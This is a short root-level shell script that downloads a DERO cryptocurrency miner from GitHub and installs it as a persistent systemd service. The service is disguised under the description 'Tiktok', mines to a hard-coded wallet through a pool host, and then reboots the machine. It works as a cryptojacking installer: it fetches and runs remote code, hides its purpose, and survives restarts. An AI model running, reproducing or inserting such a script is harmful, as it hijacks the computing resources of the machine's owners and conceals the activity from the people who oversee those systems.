cd /home
sudo wget https://github.com/deroproject/derohe/releases/download/Release114/dero_linux_amd64.tar.gz
sudo apt update
sudo tar xvzf dero_linux_amd64.tar.gz
sudo bash -c 'echo -e "[Unit]\nDescription=Tiktok\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/dero_linux_amd64/dero-miner-linux-amd64 --wallet-address deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xcr6rmv6twkhvdszaatr2 --daemon-rpc-address=community-pools.mysrv.cloud:10300\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/deroz.service'
sudo systemctl daemon-reload
sudo systemctl enable deroz.service
echo "Setup completed!"
sudo reboot
